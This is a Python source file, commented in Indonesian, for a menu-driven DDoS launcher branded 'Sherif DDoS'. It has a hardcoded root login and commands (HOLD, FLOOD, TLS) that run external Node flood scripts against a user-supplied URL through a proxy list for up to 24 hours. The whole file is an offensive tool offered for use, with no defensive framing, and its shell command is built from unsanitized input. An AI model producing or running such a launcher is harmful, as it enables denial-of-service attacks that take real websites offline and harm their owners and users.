# -*- coding: utf-8 -*-
import os
import sys
import getpass
import colorama
from typing import Tuple
from time import sleep
from datetime import datetime

# Konfigurasi dasar dengan path yang benar
CONFIG = {
    "USERNAME": "root",
    "PASSWORD": "f168",
    "VERSION": "2.0",
    "ATTACK_PATH": "./File"  # Path relatif ke folder File
}

class Colors:
    """Kelas untuk mengelola warna"""
    YELLOW = "\x1b[38;5;226m"
    GREEN = "\x1b[38;5;46m"
    ORANGE = "\x1b[38;5;166m"
    WHITE = "\033[32m"
    RED = "\033[31m"
    RESET = "\033[0m"

def clear_screen():
    """Fungsi untuk membersihkan layar"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Fungsi untuk menampilkan banner"""
    return f"""
              {Colors.YELLOW}███████╗ ██╗ ██████╗  █████╗     ██████╗ ██████╗  ██████╗ ███████╗
              {Colors.YELLOW}██╔════╝███║██╔════╝ ██╔══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
              {Colors.YELLOW}█████╗  ╚██║███████╗ ╚█████╔╝    ██║  ██║██║  ██║██║   ██║███████╗
              {Colors.YELLOW}██╔══╝   ██║██╔═══██╗██╔══██╗    ██║  ██║██║  ██║██║   ██║╚════██║
              {Colors.YELLOW}██║      ██║╚██████╔╝╚█████╔╝    ██████╔╝██████╔╝╚██████╔╝███████║
              {Colors.YELLOW}╚═╝      ╚═╝ ╚═════╝  ╚════╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝              

              ubur ubur ikan lele, kita ddos kan lee
              - Sherif DDoS v{CONFIG['VERSION']}
{Colors.RESET}"""

class AttackManager:
    """Kelas untuk mengelola serangan"""
    def __init__(self):
        self.check_requirements()

    def check_requirements(self):
        """Memeriksa kebutuhan dasar sebelum serangan"""
        # Periksa folder File/
        if not os.path.exists(CONFIG["ATTACK_PATH"]):
            print(f"{Colors.RED}Error: Folder {CONFIG['ATTACK_PATH']} tidak ditemukan{Colors.RESET}")
            sys.exit(1)

        # Periksa file proxy.txt
        proxy_path = os.path.join(CONFIG["ATTACK_PATH"], "proxy.txt")
        if not os.path.exists(proxy_path):
            print(f"{Colors.RED}Error: {proxy_path} tidak ditemukan{Colors.RESET}")
            sys.exit(1)

        # Periksa script-script yang diperlukan
        required_scripts = ["mix.js", "hold.js", "wolfme.js"]
        for script in required_scripts:
            script_path = os.path.join(CONFIG["ATTACK_PATH"], script)
            if not os.path.exists(script_path):
                print(f"{Colors.RED}Error: {script} tidak ditemukan di folder File/{Colors.RESET}")
                sys.exit(1)

    def execute_attack(self, attack_type: str, url: str, time: str) -> None:
        """Menjalankan serangan dengan parameter yang diberikan"""
        attack_scripts = {
            "TLS": "hold.js",
            "FLOOD": "wolfme.js",
            "HOLD": "mix.js"
        }
        
        script = attack_scripts.get(attack_type.upper())
        if not script:
            print(f"{Colors.RED}Error: Metode serangan tidak valid{Colors.RESET}")
            return
            
        script_path = os.path.join(CONFIG["ATTACK_PATH"], script)
        
        # Parameter yang dioptimasi
        rate = "64"  # requests per detik
        threads = "10"  # jumlah thread
        
        try:
            # Validasi waktu
            time_int = int(time)
            if time_int > 86400:  # Max 24 jam
                print(f"{Colors.RED}Error: Waktu maksimal adalah 86400 detik (24 jam){Colors.RESET}")
                return
        except ValueError:
            print(f"{Colors.RED}Error: Waktu harus berupa angka{Colors.RESET}")
            return

        command = f'cd {CONFIG["ATTACK_PATH"]} && node {script} {url} {time} {rate} {threads} proxy.txt'
        print(f"\n{Colors.GREEN}[+] Memulai serangan...{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Target: {url}{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Durasi: {time} detik{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Rate: {rate} requests/detik{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Threads: {threads}{Colors.RESET}")
        print(f"\n{Colors.YELLOW}[*] Menjalankan command: {command}{Colors.RESET}\n")
        
        os.system(command)
        clear_screen()

def help_menu():
    """Menampilkan menu bantuan"""
    clear_screen()
    print(print_banner())
    print(f"""
                TYPE THE {Colors.ORANGE}[{Colors.WHITE}METHODS{Colors.ORANGE}] [{Colors.WHITE}URL{Colors.ORANGE}] [{Colors.WHITE}TIME{Colors.ORANGE}]{Colors.YELLOW} To Start Attack
                             {Colors.ORANGE}Stay To ↓ For Update
                              ~ F168 DDOS v{CONFIG['VERSION']}
                         {Colors.GREEN}• {Colors.GREEN}HOLD {Colors.GREEN}[{Colors.GREEN}L7]    • FLOOD  {Colors.GREEN}[{Colors.GREEN}L7{Colors.GREEN}] 
                         • TLS   {Colors.GREEN}[{Colors.GREEN}L7{Colors.GREEN}]    •   -   {Colors.GREEN}[{Colors.GREEN}L7{Colors.GREEN}]
                         •   -   {Colors.GREEN}[{Colors.GREEN}L7{Colors.GREEN}]    •   -    {Colors.GREEN}[{Colors.GREEN}L7{Colors.GREEN}]
                         •   -   {Colors.GREEN}[{Colors.GREEN}L7{Colors.GREEN}]    •   -    {Colors.GREEN}[{Colors.GREEN}L7{Colors.GREEN}]

                Example: FLOOD https://example.com 120
{Colors.RESET}""")

def main():
    """Fungsi utama program"""
    clear_screen()
    print(print_banner())
    print(f"\t\t\t Type {Colors.ORANGE}[{Colors.WHITE}help{Colors.ORANGE}] To See Use{Colors.RESET}")

    attack_manager = AttackManager()
    
    while True:
        try:
            # Set window title
            print(f"\033]0;Sherif DDoS :: Online Users: [1]\007", end='', flush=True)
            
            # Prompt yang lebih bersih
            prompt = f"{Colors.GREEN}ZRO168{Colors.WHITE}:~# {Colors.RESET}"
            command = input(prompt)
            
            cmd = command.split()
            if not cmd:
                continue
                
            command_type = cmd[0].upper()
            
            if command_type in ["CLEAR", "CLS"]:
                clear_screen()
                print(print_banner())
                
            elif command_type in ["HELP", ".HELP", "MENU", ".MENU"]:
                help_menu()
                
            elif command_type in ["EXIT", "QUIT"]:
                print(f"\n{Colors.GREEN}SAMPAI JUMPA KEMBALI!{Colors.RESET}")
                sys.exit(0)
                
            elif command_type in ["TLS", "FLOOD", "HOLD"]:
                try:
                    url = cmd[1]
                    time = cmd[2]
                    attack_manager.execute_attack(command_type, url, time)
                except IndexError:
                    print(f"{Colors.RED}Error: Format yang benar adalah: {command_type} [URL] [TIME]{Colors.RESET}")
            else:
                print(f"{Colors.RED}Error: Perintah tidak dikenal. Ketik 'help' untuk bantuan.{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.GREEN}Mematikan serangan...{Colors.RESET}")
            continue

def login():
    """Fungsi login"""
    attempts = 3
    while attempts > 0:
        clear_screen()
        print(print_banner())
        
        username = input(f"{Colors.RED}[{Colors.YELLOW}USERNAME{Colors.RED}]:{Colors.RESET} ")
        password = getpass.getpass(prompt=f'{Colors.RED}[{Colors.YELLOW}PASSWORD{Colors.RED}]:{Colors.RESET} ')
        
        if username == CONFIG["USERNAME"] and password == CONFIG["PASSWORD"]:
            print(f"\n{Colors.RED}Login Berhasil!{Colors.RESET}")
            sleep(1)
            main()
        else:
            attempts -= 1
            print(f"\n{Colors.RED}Login Gagal! Sisa percobaan: {attempts}{Colors.RESET}")
            sleep(1)
    
    print(f"\n{Colors.RED}Terlalu banyak percobaan gagal. Program berhenti.{Colors.RESET}")
    sys.exit(1)

if __name__ == "__main__":
    try:
        # Inisialisasi colorama untuk support warna di Windows
        colorama.init()
        
        # Cek apakah running sebagai root di Linux
        if os.name != 'nt' and os.geteuid() != 0:
            print(f"{Colors.RED}Error: Script ini harus dijalankan sebagai root{Colors.RESET}")
            sys.exit(1)
            
        login()
    except KeyboardInterrupt:
        print(f"\n{Colors.GREEN}Program dihentikan oleh user.{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}Error tidak terduga: {str(e)}{Colors.RESET}")
        sys.exit(1)